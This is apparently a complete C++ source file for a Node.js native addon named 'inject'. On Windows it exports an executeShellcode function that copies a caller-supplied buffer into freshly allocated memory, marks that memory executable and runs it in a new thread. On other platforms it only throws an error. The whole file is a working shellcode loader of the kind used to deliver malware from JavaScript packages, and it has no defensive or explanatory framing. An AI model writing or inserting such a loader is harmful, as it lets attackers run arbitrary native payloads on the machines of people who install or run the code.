#include <napi.h>

#ifdef _WIN32
#include <windows.h>

Napi::Value ExecuteShellcode(const Napi::CallbackInfo& info) {
  Napi::Env env = info.Env();

  if (info.Length() < 1 || !info[0].IsBuffer()) {
    Napi::TypeError::New(env, "Buffer expected").ThrowAsJavaScriptException();
    return env.Null();
  }

  Napi::Buffer<unsigned char> buffer = info[0].As<Napi::Buffer<unsigned char>>();
  unsigned char* shellcode = buffer.Data();
  size_t shellcode_len = buffer.Length();

  // Allocate executable memory
  LPVOID exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (exec_mem == NULL) {
    Napi::Error::New(env, "VirtualAlloc failed").ThrowAsJavaScriptException();
    return env.Null();
  }

  // Copy shellcode to allocated memory
  memcpy(exec_mem, shellcode, shellcode_len);

  // Change memory protection to executable
  DWORD old_protect;
  if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &old_protect)) {
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    Napi::Error::New(env, "VirtualProtect failed").ThrowAsJavaScriptException();
    return env.Null();
  }

  // Create thread to execute shellcode
  HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
  if (hThread == NULL) {
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    Napi::Error::New(env, "CreateThread failed").ThrowAsJavaScriptException();
    return env.Null();
  }

  // Wait for thread completion (optional - you can remove this for async execution)
  WaitForSingleObject(hThread, INFINITE);
  CloseHandle(hThread);

  // Clean up
  VirtualFree(exec_mem, 0, MEM_RELEASE);

  return Napi::Boolean::New(env, true);
}

Napi::Object Init(Napi::Env env, Napi::Object exports) {
  exports.Set(Napi::String::New(env, "executeShellcode"),
              Napi::Function::New(env, ExecuteShellcode));
  return exports;
}

NODE_API_MODULE(inject, Init)

#else
// Non-Windows stub
Napi::Value ExecuteShellcode(const Napi::CallbackInfo& info) {
  Napi::Env env = info.Env();
  Napi::Error::New(env, "Shellcode injection only supported on Windows").ThrowAsJavaScriptException();
  return env.Null();
}

Napi::Object Init(Napi::Env env, Napi::Object exports) {
  exports.Set(Napi::String::New(env, "executeShellcode"),
              Napi::Function::New(env, ExecuteShellcode));
  return exports;
}

NODE_API_MODULE(inject, Init)
#endif

